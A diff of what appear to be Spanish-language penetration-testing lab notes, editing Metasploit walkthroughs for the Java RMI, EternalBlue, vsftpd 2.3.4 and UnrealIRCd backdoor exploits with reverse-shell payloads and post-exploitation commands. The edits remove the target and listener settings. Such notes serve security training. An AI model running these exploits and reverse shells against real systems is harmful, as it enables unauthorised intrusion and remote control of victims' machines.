@@ -138,19 +138,13 @@ msfconsole
 search java_rmi_server
 use exploit/multi/misc/java_rmi_server
 
-# 4. Configurar opciones
-set RHOSTS <IP_VICTIMA>
-set RPORT 1099
-
-# 5. Elegir payload
+# 4. Elegir payload
 set payload java/meterpreter/reverse_tcp
-set LHOST <IP_ATACANTE>
-set LPORT 4444
 
-# 6. Ejecutar exploit
+# 5. Ejecutar exploit
 exploit
 
-# 7. Post-explotación 
+# 6. Post-explotación 
 getuid
 sysinfo
 ifconfig
@@ -227,15 +221,9 @@ run
 # 2. Si es vulnerable, seleccionar exploit
 use exploit/windows/smb/ms17_010_eternalblue
 
-# 3. Configurar opciones
-set RHOSTS <IP_WINDOWS>
-set RPORT 445
-
 # 4. Elegir payload (windows/x64/meterpreter/reverse_tcp — necesario para
 #    sistemas x64, Meterpreter ofrece capacidades avanzadas de post-explotación)
 set payload windows/x64/meterpreter/reverse_tcp
-set LHOST <IP_ATACANTE>
-set LPORT 4444
 
 # 5. Ejecutar exploit
 exploit
@@ -268,12 +256,18 @@ sessions -i <ID_SESION>
 ```bash
 # 1
 msfconsole
+
 # 2
+search vsftpd
+
 # 3
 use exploit/unix/ftp/vsftpd_234_backdoor
-# 3 
-set RHOSTS <IP_VICTIMA>
-# 4
+
+# 4 
+show payloads
+set payload <payload>
+
+# 5
 exploit
 ```
 ![](attachments/{AA746A9D-E5DD-4EF4-88BC-51EB0C86DB5C}.png)
@@ -295,7 +289,8 @@ msfconsole
 search ircd
 # 3
 use exploit/unix/irc/unreal_ircd_3281_backdoor
-# 4
+# 4 
+show payloads
 set payload cmd/unix/reverse_perl
 # 5
 exploit
